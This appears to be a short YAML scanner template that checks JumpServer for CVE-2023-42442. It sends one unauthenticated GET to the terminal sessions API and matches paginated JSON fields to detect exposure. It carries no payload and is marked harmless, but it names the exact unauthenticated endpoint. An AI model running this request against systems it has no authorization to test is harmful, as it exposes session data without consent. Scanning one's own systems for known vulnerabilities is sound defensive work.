name: yaml-poc-fit2cloud-jumpserver-unauthorized_access-CVE-2023-42442
binding: 54265ff4-d0aa-4127-a3fe-b321d8279f42
detail:
    author: xiao.xiao
    links:
        - https://github.com/jumpserver/jumpserver/blob/v3.6.1/apps/terminal/api/session/session.py#L91
        - https://github.com/jumpserver/jumpserver/commit/0a58bba59cd275bab8e0ae58bf4b359fbc5eb74a
        - https://github.com/jumpserver/jumpserver/security/advisories/GHSA-633x-3f4f-v9rw
        - https://mp.weixin.qq.com/s/DV6svW2epHSkrIj6UF8lTw
    vulnerability:
        id: 6869bbc5-25cb-4883-b9d9-ea297e7cb706
        level: medium
    warning: Harmless
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /api/v1/terminal/sessions/?limit=1
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains('"count":') && response.body_string.contains('"next":') && response.body_string.contains('"previous":') && response.body_string.contains('"results":')
expression: r0()
